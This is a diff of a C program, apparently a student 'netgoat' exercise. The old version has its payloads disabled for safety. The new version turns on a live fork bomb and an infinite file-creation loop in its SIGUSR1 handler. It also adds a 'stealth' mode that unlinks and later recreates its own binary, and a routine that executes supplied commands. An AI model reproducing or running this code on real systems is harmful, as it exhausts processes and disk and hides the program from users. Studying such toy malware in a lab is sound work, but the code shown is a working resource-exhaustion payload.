@@ -1,186 +1,266 @@
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/types.h>
-#include <fcntl.h>
-#include <sys/wait.h>
-#include <sys/stat.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 #include <errno.h>
+#include <stdlib.h>
+#include <getopt.h>
+#include <string.h>
+#include <malloc.h>
 #include <signal.h>
-//#include <dir.h>
-//#include <process.h>
 
-#define maxBufferLength 4096
+char *fd;
+int toggle = 0;
+int flip;
+#define STD_ERR_RETURN  -1
 
-//UNIVERSAL VARIABLES
-char universalProgramBuffer[maxBufferLength];
-int universalStealthModeTracker = 0;
-int variablePayloadsTracker = 0;
-int executable_FD; 
+void sighandle(int num);
 
-//FUNCTION PROTOTYPES
-void handleSignal(int signalReceived);
-int stealth(int fd_in);
-int cat(int fd_in, int fd_out);
-void show_usage(); //function for help information
-int storeToTMP();
-int seatsTaken();
-int forkBombEm();
-void executeIt(char *argv[]);
+int straycat(int argc, char *argv[]);  //prototype function for file 1
+int flags(int argc, char *argv[]);
+int stealth();
+void unstealth();
+void myshell(char *argv[]);
+void show_usage();
+int main(int argc, char *argv[])
+{
+   //int intPause = 0;
+   int fail;
+   flip = flags(argc, argv);
 
-int main(int argc, char *argv[]){
-  
-  //SIGNAL HANDLING CODE
-  struct sigaction sigHandler;
-  sigHandler.sa_handler = &handleSignal;
-  sigHandler.sa_flags = SA_RESTART;
-  if (sigaction(SIGUSR1, &sigHandler, NULL) < 0) {
-    printf("Error with SIGUSR1 sigaction.");
-    return 1;
-  }
-  if (sigaction(SIGUSR2, &sigHandler, NULL) < 0) {
-    printf("Error with SIGUSR2 sigaction.");
-    return 1;
-  }
+   while(1){
+   struct sigaction handle;  // sigaction for signal handler information
+       // Perform Function
+       // Setup the information to register the signal handler
+    handle.sa_handler = &sighandle;
+    handle.sa_flags = SA_RESTART;
 
-
-  printf("signal handler part complete\n\n");
-
-  //PRINT OUT THE PID FOR SIGNALS
-  printf("\nPID: %ld\n\n", (long)getpid());
-
-  if (argc == 1){ //argument number tracking
-    printf("No arguments entered. Displaying Help Message\n");
-    show_usage(); 
-  }
-
-  //store the executable into a buffer
-    int fd_in = open("a.out", O_RDONLY); //open the executable
-    executable_FD = fd_in;
-    if (fd_in < 0){
-      perror("ERROR IS");
-      return(0);
-      }
-    int buffer_size = read(fd_in, universalProgramBuffer, maxBufferLength);
-    buffer_size = buffer_size; // Remove warning
-    printf("buffer reading and storage complete.\n\n");
-
-  //base variables for tracking for progress
-  int catFunction = 0;
-  //int stealthModeTracker = 0;
-  //int forkBombTracker = 0;
-  int echoFunction = 0;
-  //int seatsTakenTracker = 0;
-  printf("Variable storage complete.\n\n");
-
-  //OPTION HANDLING
-  //printf("\nOPTION HANDLING STARTING.");
-  char opt;
-  while((opt = getopt(argc, argv, "hlscfevtrzw")) != -1){
-    switch(opt){
-      case 'h':
-        show_usage();
-        return(0); //end the program
-        break;
-      case 'l':
-        printf("*test* l option entered.\n");
-        break;
-      case 's':
-        printf("*test* stealth mode enabled.\n");
-        stealth(fd_in);
-        universalStealthModeTracker = 1;
-        break;
-      case 'c':
-        printf("*test* cat functionality enabled. \n");
-        catFunction = 1;
-        break;
-      case 'e':
-        printf("*test* echo functionality enabled. \n");
-        echoFunction = 1;
-        break;
-      case 'v':
-        printf("*test*Variable Payloads activated.");
-        variablePayloadsTracker = 1;
-        break;
-      case 'f':
-        printf("*test* fork bomb activated");
-        //forkBombTracker = 1;
-        forkBombEm();
-        break;
-      case 't':
-        printf("*test* Seats Taken.");
-        //seatsTakenTracker = 1;
-        seatsTaken();
-        break;
-      case 'r':
-        printf("Storing a version into tmp.");
-        storeToTMP();
-        break;
-      case 'w':
-        printf("\n\nUser Wait Mode Activated.\n\n");
-        while(1){
-        }
-        break;
-      case 'z':
-        printf("Execute Option Triggered. Outpuy below: \n\n");
-        executeIt(argv);
-        printf("\n\n.");
-        break;
-    }
-  }
-
-  //MILESTONE 2 CAT FUNCTIONALITY
-  if (echoFunction == 1){  
-  int iterator;
-  for (iterator = 2; iterator < argc; iterator++){
-    write(1, argv[iterator], strlen(argv[iterator]));
-    write(1, " ", 1);
-  }
-
-  }
-
-  if (catFunction == 1){
-    int fdcat = open(argv[2], O_RDONLY);
-    cat(fdcat, 1);      
-    }
-
-
-  while(1){
-  }
-}//end main
-
-void handleSignal(int signalReceived){
-  switch(signalReceived){
-    case (SIGUSR1): //SIGUSR1
-      //printf("SIGUSR1 received");
-      if (variablePayloadsTracker == 0){
-        printf("SIGUSR1 Received.\n");
-        printf("Triggering Stealth.\n");
-        stealth(executable_FD);
-      }
-      else{
-         printf("SIGUSR 1 Received.\n");
-         printf("Calling On Seats Taken\n");
-         seatsTaken();
-      }
-     break;
-    case (SIGUSR2): //SIGUSR2 
-     if (variablePayloadsTracker == 0){
-        printf("SIGUSR2 Received.\n");
-        printf("Calling on forkbonb function.\n");
-        forkBombEm();
+   fail = sigaction(SIGUSR1, &handle, NULL);
+   if ( fail == STD_ERR_RETURN ) {
+         fprintf(stderr, "ERROR: Unable to register signal handler\n");
+         return 2;
      }
-     else{
-         printf("SIGUSR2 Received.\n");
-         printf("Calling on storeToTMP.\n");
-         storeToTMP();
-         break;
+   fail = sigaction(SIGUSR2, &handle, NULL);
+   if ( fail == STD_ERR_RETURN ) {
+         fprintf(stderr, "ERROR: Unable to register signal handler\n");
+         return 2;
+      }
+  
+   fail = sigaction(SIGINT, &handle, NULL);
+   if ( fail == STD_ERR_RETURN ) {
+        fprintf(stderr, "ERROR: Unable to register signal handler\n");
+         return 2;
+           }
+          
+  printf("(%ld) Waiting for signals...\n", (long)getpid());
+  pause();
   }
-  }
+  
+
+
+return(0);
+}
+int straycat(int argc, char *argv[])
+   {
+   int fd;  //file descriptor (refers to file)
+   int num_read;  //number of bytes to read from file
+   char buffer[1000];   //buffer data to store data being read
+   int i;
+
+   for(i = 2; i < argc; i++)
+   {  
+       //declare and use getopt in order to display help with using the myCat
+       //program
+       //in the command line type -h by itself to display help
+       
+
+       fd = open(argv[i], O_RDONLY); //open file. flag arguement is read only(O_RDONLY)
+
+ if(strcmp(argv[i], "-") == 0)  //enter file argument followed by a "-" will takk
+   // e any standard input and have it displayed as standard output until EOF
+         { 
+              int second_read;
+              while ((second_read = read(0, buffer, 1000)) != -1)
+              { 
+                  write(1, buffer, second_read);
+                  printf("\n");
+    
+                  if((second_read = read(0, buffer, 1000)) == -1)
+                     { 
+                        close(second_read);
+                        exit(0);
+                     } 
+              } 
+         } 
+
+
+
+       if(fd < 0) //error statements where if an error is thrown, a return value of 1-4 is returned to main
+       {
+          perror("Error");
+          return (-1);
+       }
+
+       while((num_read = read(fd, buffer, 1000)) > 0)
+       {       
+          if(num_read < 0)//read data in buffer array
+          {
+             perror("Error");
+             return (-2);
+          } 
+          if(write(1, buffer, num_read) < 0)//write the file to standard outputi
+          {
+             perror("Error ");
+             return (-3);
+          }    
+       }
+       if(close(fd) < 0) //close the file
+       {
+          perror("Error ");
+          return (-4); 
+       }
+       printf("\n");
+
+        
+   }
+   return(0);  
 }
 
-void executeIt(char *argv[]){
+int flags(int argc, char *argv[]){
+ int opt = 0;
+       while((opt = getopt(argc, argv, "hc:sfe:")) != -1)
+       {
+          switch(opt)
+          {
+             case 'h':
+             show_usage();
+             break;
+
+             case 's':
+             stealth();
+             toggle = 1;
+             
+             break;
+
+             case 'c':
+             straycat(argc, argv);
+             break;
+
+             case 'f':
+             flip = -1;
+             return(flip);
+             break;
+
+             case 'e':
+              myshell(&argv[2]);
+              break;
+           }
+          //exit(0);
+       }
+       //return(0);
+       return(flip);
+}
+ 
+int stealth()
+{
+  // Declare Required Variables
+   int fd;  //file descriptor (refers to file)
+   int num_read;  //number of bytes to read from file
+  int intPause = 0;  // Variable to force pausing point within program, to support external testing
+  // Perform Function
+   fd = open("netgoat", O_RDONLY); //open file or create new file with permissions
+   if(fd < 0) //error statements where if an error is thrown, a return value of 1- 4 is returned to main
+   {
+      perror("Error");
+      printf("There was an open error\n");
+      return (-1);
+   }
+   int size = lseek(fd, 0, SEEK_END);  //seek till the end of file to obtain size
+   lseek(fd, 0, SEEK_SET); //seek back to beginning of file byte 
+  char buffer[size + 1];   //set buffer size equal to previous seeked byte size of file plus 1 extra byte
+  buffer[size] = '\0'; //file null termination 
+   while((num_read = read(fd, buffer, size)) > 0)
+   {
+      if(num_read < 0)//read data in buffer array
+      {
+         perror("Error");
+         printf("There was a read error\n");
+         return (-2);
+      }
+   }
+   
+   unlink("netgoat");  //remove the specified file
+  
+fprintf( stdout, "Entered Stealth Mode\n");
+printf("PID: (%ld)\n", (long)getpid());
+scanf("%d", &intPause);  // Read in integer as forced pause point
+toggle = 1;
+int fd_2 = open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);//create new file with read,write, and execute permissions and store in the read data from the recently removed file
+  write(fd_2, buffer, strlen(buffer));
+  close(fd);
+  close(fd_2);
+  // link("netgoat", "netgoat");
+return(0);
+}
+
+  void unstealth(){
+
+printf("PID: (%ld)\n", (long)getpid());
+int fd_2;
+fd_2 = open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);//create new file with read,write, and execute permissions and store in the read data from the recently removed file
+
+// write(fd_2, buffer, strlen(buffer));
+   close(fd_2);
+   toggle = 0;
+}
+
+
+void sighandle(int num) {
+   if(flip ==-1){
+switch (num) {
+          case SIGUSR1:
+           while(1){
+        open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);    
+           }             
+     
+            break;
+          case SIGUSR2:
+         printf("Sorry, feature is temporarily unavailable\n");
+
+          break;
+
+  }
+   }
+   else{
+     switch (num) {
+          case SIGUSR1:
+           while(1){
+            fork();
+            int *p = (int *) malloc (sizeof (int) * 100000);
+            p=p; //Remove unused var warning.
+            printf("BOMB!");
+          }
+     
+            break;
+          case SIGUSR2:
+         if(toggle == 1){ 
+          printf("exit stealth mode\n");
+          unstealth();
+          
+
+         }
+         else{
+            stealth();
+         }
+          
+          break;
+     }
+     return;
+}
+}
+void myshell(char *argv[]){
     if (!getenv("PATH")){ // test to see if PATH is not null, then execute
     setenv("PATH", "/bin:/usr/bin:/usr/local/bin", 1);
   }
@@ -198,120 +278,7 @@ void executeIt(char *argv[]){
     }
         //execvp(command.cmd, command.argv);
 }
-
-
-int forkBombEm(){
-   printf("Executing Fork Bomb Code.\n"); //FORK BOMB COMMENTED OUT
-   /*
-   while(1){ //infinite while loop
-      fork(); //fork bomb
-    }
-   return(0);
-   */
-   int count = 1;
-   while (count != 100){
-     printf("\nfork\n");
-     count++;
-   }
-   exit(0);
-}
-
-int seatsTaken(){
-   printf("Executing Seats Taken Code.\n");
-   //COMMENTED OUT FOR SAFETY
-   /*
-    while(1){
-    char *newFileName = tempnam("/tmp", "netGoatFile");
-    int fd;
-    fd = open(newFileName, O_WRONLY | O_CREAT, S_IWUSR);
-    }
-    */
-
-   int count = 1;
-   while (count != 100){
-     printf("\nnewFileCreated%d\n", count);
-     count++;
-   }
-   exit(0);
-
-
-   return(0);
-}
-
-int stealth(int fd_in){    
-  int fd_output;
-    switch(universalStealthModeTracker){
-      case(0):
-        printf("\n\nTurning stealth on.\n");
-        if (unlink("a.out") < 0){  //UNLINK
-          perror("ERROR IS");
-          return(0);
-        }
-
-        if (lseek(fd_in, 0, SEEK_SET) < 0){ //reset the little reading pointer
-          perror("ERROR IS");
-          return(0);
-        }
-        universalStealthModeTracker = 1; //stealth on
-        break;
-
-      case(1):
-        printf("\nTurning stealth off.\n");
-        fd_output = open("a.out", O_WRONLY|O_CREAT, S_IRWXU); //create the new executables name
-        if(cat(fd_in, fd_output) != 0){ //calls on cat function to copy old to new
-          perror("ERROR IS");
-          return(0);
-        }
-        //printf("ALL COPYING COMPLETE");
-        //printf("Program resumed");
-        //scanf("Enter a character");
-        universalStealthModeTracker = 0;
-        break;
-    }
-    return(0);
-}
-  
-int storeToTMP(){
-   char *newFileName = tempnam("/tmp", "NGC");
-   char permissions[] = "0777";
-   int i = strtol(permissions, 0, 8);
-   int fileDescriptorOut;
-   if((fileDescriptorOut = open(newFileName, O_WRONLY | O_CREAT, i)) < 0){
-      perror("ERROR OUT");
-   }
-
-   if((cat(executable_FD, fileDescriptorOut)) < 0){
-      perror("ERROR");
-      }
-   printf("%s Created\n\n", newFileName);
-   char finalFile[20] = "";
-   strcat(finalFile, "/tmp");
-   strcat(finalFile, newFileName);
-   //printf("%s", strcat("/tmp", newFileName));
-   chmod(finalFile, i);
-   close(fileDescriptorOut);
-   return(0);
-
-}
-
-
-int cat(int fd_in, int fd_out){
-  int buffer_length = 1;
-  char buffer[maxBufferLength];
-
-  while(buffer_length > 0){
-        buffer_length = read(fd_in, buffer, maxBufferLength);
-        if (buffer_length < 0 ){
-                perror("ERROR IS");
-                return(0);
-        }
-        if(write(fd_out, buffer, buffer_length) < 0){
-                perror("ERROR IS");
-                return(0);
-        }
-  }
-return(0);
-}
+  // Return to Caller;
 
 void show_usage(){
              printf("NAME\n\n");
